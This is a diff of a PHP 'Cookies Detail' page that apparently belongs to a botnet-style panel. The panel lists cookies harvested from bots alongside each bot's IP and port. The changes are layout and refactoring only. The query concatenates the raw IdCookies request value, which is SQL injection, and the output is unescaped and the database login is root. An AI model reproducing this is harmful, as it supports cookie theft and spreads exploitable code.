@@ -2,7 +2,14 @@
 <?php
 $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
 if (mysqli_connect_errno()) exit;
+$header_display = "Cookies Detail ";
 
+$IdCookies = "";
+$Ip = "";
+$Port ="";
+$Url = "";
+$CookiesResult = "";
+$Time = "";
 
 if (isset($_REQUEST['IdCookies'])) {
     $id = $_REQUEST['IdCookies'];
@@ -10,18 +17,17 @@ if (isset($_REQUEST['IdCookies'])) {
     if (mysqli_connect_errno()) exit;
     $sql = "Select cookies.IdCookies,cookies.Time, cookies.Url,cookies.CookiesResult, bot.Ip, bot.Port from cookies,bot where IdCookies = " . $id . " and bot.Id = cookies.IdBot";
     $rs = mysqli_query($db, $sql);
-}
-
-$header_display = "Cookies Detail ";
-
-
-while ($row = mysqli_fetch_array($rs)) {
-    $IdCookies = $row["IdCookies"];
-    $Ip = $row["Ip"];
-    $Port = $row["Port"];
-    $Url = $row["Url"];
-    $CookiesResult = $row["CookiesResult"];
-    $Time = $row["Time"];
+    
+    
+    
+    while ($row = mysqli_fetch_array($rs)) {
+      $IdCookies = $row["IdCookies"];
+      $Ip = $row["Ip"];
+      $Port = $row["Port"];
+      $Url = $row["Url"];
+      $CookiesResult = $row["CookiesResult"];
+      $Time = $row["Time"];
+    }
 }
 
 echo '<!DOCTYPE html>
@@ -168,10 +174,11 @@ echo '<!DOCTYPE html>
       .content {
         display: flex;
         flex-direction: column;
-        align-items: center;
-        /* justify-content: center; */
+      
+        justify-content: space-between;
         width: 100%;
-        min-height: 90%;
+        min-height: 80%;
+        height: 82%;
         padding: 30px;
       }
       .content_table {
@@ -227,6 +234,18 @@ echo '<!DOCTYPE html>
             border: 1px solid #00ff00;
             outline: none;
             border-radius: 4px;
+        }
+         .content_back
+        {
+            margin-top:16px;
+            color: #00ff00;
+            border:none;
+            outline: none;
+            font-size:16px;
+            text-decoration: underline;
+            background: transparent;
+            cursor:pointer;
+            align-self: flex-start;
         }
     </style>
   </head>
@@ -303,7 +322,9 @@ echo '<!DOCTYPE html>
                 rows="8"
             >' . $CookiesResult . '</textarea>
           </div>
+          <button class="content_back" onclick="history.back()">Go Back</button>
         </div>
+
       </div>
       <div class="navigate">
         <a href="listBot.php" class="navigate_btn">
